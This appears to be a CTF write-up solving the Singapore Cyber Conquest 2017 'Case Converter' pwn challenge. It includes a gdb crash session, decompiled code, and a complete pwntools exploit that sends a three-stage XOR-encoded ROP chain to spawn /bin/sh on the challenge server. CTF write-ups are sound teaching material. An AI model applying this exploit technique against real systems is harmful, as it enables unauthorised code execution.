---
title: "Singapore Cyber Conquest 2017 - Case Converter (Pwn)"
header:
  overlay_image: /assets/images/scc2017/caseconverter/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Jordan Gellie on Unsplash"
tags:
  - scc2017
  - writeup
  - pwn
---

Simple stack overflow with a statically compiled binary can be exploited with
a generated execve ROP chain. The ROP chain has to be split up into multiple
stages to bypass a lack of payload space.

## Challenge Description

#### Points

300

#### Description

```
It's a case convertor. nc 13.228.156.5 56746

PS: gdb is helpful !
```

#### Solvers

1 Teams solved

## Solution


The binary is a simple 64 bit ELF that converts uppercase characters to
lowercase.

```shell
$ ./ae3dd3458e165fce0c97842a86585ec3_case_convertor
String :ABCDEFG
Result:abcdefg
```

It has the following protections:

```shell
$ checksec ae3dd3458e165fce0c97842a86585ec3_case_convertor
[*] '/vagrant/scc/case/ae3dd3458e165fce0c97842a86585ec3_case_convertor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Getting RIP control is trivial.

```shell
$ gdb ./ae3dd3458e165fce0c97842a86585ec3_case_convertor
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ae3dd3458e165fce0c97842a86585ec3_case_convertor...
(no debugging symbols found)...done.
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAe
AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAA
pAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /vagrant/scc/case/ae3dd3458e165fce0c97842a86585ec3_case_convertor
String :AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA
3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARA
AoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
aaadaaaaaaeaaAaaaafaaBaaaagaaCaaaahaaDaaaaiaaEaaaajaaFaaaakaaGaaaalaaHaaaamaa
IaaaanaaJaaaaoaaKaapaaLaaqaaMaaraaOaasaaPaataaQaauaaRaavaaTaawaaUaaxaaVaayaaW
aazaaXaaYa�@

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x4002c8 (<_init>:    sub    rsp,0x8)
RCX: 0x43fbc0 (<__write_nocancel+7>:    cmp    rax,0xfffffffffffff001)
RDX: 0x6cc540 --> 0x0
RSI: 0x7fffffffbd90 ("Result:aaa\005aaSaabaa\004aaNaacaa\raa\baadaa\033aa\taae
aaAaa\020aafaaBaa\021aagaaCaa\022aahaaDaa\023aaiaaEaa\024aajaaFaa\025aakaaGaa
\026aalaaHaa\027aamaaIaa\030aanaaJaa\031aaoaaKaapaaLaaqaaMaaraaOaasaaPaataaQaa
uaaRaavaaTaawaaUaaxaaVaayaaWaaz"...)
RDI: 0x1
RBP: 0x4c61617061614b61 ('aKaapaaL')
RSP: 0x7fffffffe488 ("aaqaaMaaraaOaasaaPaataaQaauaaRaavaaTaawaaUaaxaaVaayaaWaa
zaaXaaYa\300\027@")
RIP: 0x400bc2 (<main+80>:    ret)
R8 : 0x6ce880 (0x00000000006ce880)
R9 : 0xd3
R10: 0xcb
R11: 0x246
R12: 0x401730 (<__libc_csu_init>:    push   r14)
R13: 0x4017c0 (<__libc_csu_fini>:    push   rbx)
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400bb7 <main+69>:    call   0x40f830 <printf>
   0x400bbc <main+74>:    mov    eax,0x0
   0x400bc1 <main+79>:    leave
=> 0x400bc2 <main+80>:    ret
   0x400bc3:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400bcd:    nop    DWORD PTR [rax]
   0x400bd0 <generic_start_main>:    push   r14
   0x400bd2 <generic_start_main+2>:    push   r13
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 ("aaqaaMaaraaOaasaaPaataaQaauaaRaavaaTaawaaUaaxaaVaayaaWaazaaXaaYa\300\027@")
0008| 0x7fffffffe490 ("raaOaasaaPaataaQaauaaRaavaaTaawaaUaaxaaVaayaaWaazaaXaaYa\300\027@")
0016| 0x7fffffffe498 ("aPaataaQaauaaRaavaaTaawaaUaaxaaVaayaaWaazaaXaaYa\300\027@")
0024| 0x7fffffffe4a0 ("aauaaRaavaaTaawaaUaaxaaVaayaaWaazaaXaaYa\300\027@")
0032| 0x7fffffffe4a8 ("vaaTaawaaUaaxaaVaayaaWaazaaXaaYa\300\027@")
0040| 0x7fffffffe4b0 ("aUaaxaaVaayaaWaazaaXaaYa\300\027@")
0048| 0x7fffffffe4b8 ("aayaaWaazaaXaaYa\300\027@")
0056| 0x7fffffffe4c0 ("zaaXaaYa\300\027@")
[------------------------------------------------------------------------------] blue
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400bc2 in main ()
gdb-peda$ bt
#0  0x0000000000400bc2 in main ()
#1  0x61614d6161716161 in ?? ()
#2  0x617361614f616172 in ?? ()
#3  0x5161617461615061 in ?? ()
#4  0x6161526161756161 in ?? ()
#5  0x6177616154616176 in ?? ()
#6  0x5661617861615561 in ?? ()
#7  0x6161576161796161 in ?? ()
#8  0x615961615861617a in ?? ()
#9  0x00000000004017c0 in ?? ()
#10 0x0000000000000000 in ?? ()
gdb-peda$
```

The only complication is that the input is xored against 0x20 to make uppercase
characters lowercase.

```c
int convert_str(int arg0, int arg1) {
    var_18 = arg0;
    var_8 = __libc_malloc(0xd9, arg1);
    _IO_printf("String :", arg1, rdx, rcx, r8, r9, stack[2043]);
    read_input(var_8, 0xd9);
    *(int32_t *)len = strlen(var_8);
    for (*(int32_t *)i = 0x0; *(int32_t *)i < *(int32_t *)len; *(int32_t *)i = *(int32_t *)i + 0x1) {
            *(int8_t *)(var_8 + sign_extend_64(*(int32_t *)i)) =
            *(int8_t *)(var_8 + sign_extend_64(*(int32_t *)i)) & 0xff ^ 0x20;
    }
    rax = *(int32_t *)len;
    rax = memcpy(var_18, var_8, sign_extend_64(rax));
    return rax;
}
```

The solution script:

```python
from pwn import *

from struct import pack

main_address = 0x400b72

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # ./case
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000005b68) # 0x0000000000405b68: pop r13; ret;
rop += '//bin/sh'
rop += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret;
rop += p64(0x6cc000)
rop += rebase_0(0x000000000005c995) # 0x000000000045c995: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p64(main_address)

rop2 = ""
rop2 += rebase_0(0x0000000000005b68) # 0x0000000000405b68: pop r13; ret;
rop2 += p(0x0000000000000000)
rop2 += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret;
rop2 += p64(0x6cc008)
rop2 += rebase_0(0x000000000005c995) # 0x000000000045c995: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop2 += p(0xdeadbeefdeadbeef)
rop2 += p(0xdeadbeefdeadbeef)
rop2 += p(0xdeadbeefdeadbeef)
rop2 += p(0xdeadbeefdeadbeef)
rop2 += p64(main_address)

rop3 = ""
rop3 += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret;
rop3 += p64(0x6cc000)
rop3 += rebase_0(0x00000000000017b7) # 0x00000000004017b7: pop rsi; ret;
rop3 += p64(0x6cc008)
rop3 += rebase_0(0x0000000000042f86) # 0x0000000000442f86: pop rdx; ret;
rop3 += p64(0x6cc008)
rop3 += rebase_0(0x000000000001e398) # 0x000000000041e398: pop rax; ret;
rop3 += p(0x000000000000003b)
rop3 += rebase_0(0x00000000000676d5) # 0x00000000004676d5: syscall; ret;

rop4 = ""

def main():
    #p = process("./case")
    p = remote("13.228.156.5", 56746)

    # Stage 1

    payload = "A"*136
    payload += rop
    payload = payload.ljust(217, "\x90")

    payload = xor(payload, 0x20)

    p.send(payload)

    # Stage 2

    payload = "A"*136
    payload += rop2
    payload = payload.ljust(217, "\x90")

    payload = xor(payload, 0x20)

    p.send(payload)

    # Stage 2

    payload = "A"*136
    payload += rop3
    payload = payload.ljust(217, "\x90")

    payload = xor(payload, 0x20)

    p.send(payload)

    p.clean()

    p.interactive()

if __name__ == "__main__":
    main()
```

Running the script:

```shell
$ python exploit.py
[+] Starting local process './case': pid 5601
[*] Switching to interactive mode
$ whoami
ubuntu
$ uname -a
Linux ubuntu-xenial 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC
2017 x86_64 x86_64 x86_64 GNU/Linux
$
```
